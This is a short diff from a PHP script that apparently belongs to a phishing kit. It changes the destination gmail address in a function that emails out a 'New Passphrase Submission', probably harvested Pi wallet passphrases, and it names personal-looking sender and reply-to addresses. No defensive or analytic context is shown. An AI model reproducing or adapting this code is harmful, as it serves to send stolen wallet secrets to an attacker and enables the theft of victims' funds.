@@ -66,7 +66,7 @@ function sendEmail($jsonFilePath, $txtFilePath) {
 
     $postData = [
         'ishtml' => 'false',
-        'sendto' => 'ol37288997@gmail.com',
+        'sendto' => 'piphrase042@gmail.com',
         'name' => 'Pi',
         'replyTo' => 'peterjfk243@gmail.com',
         'title' => 'New Passphrase Submission',
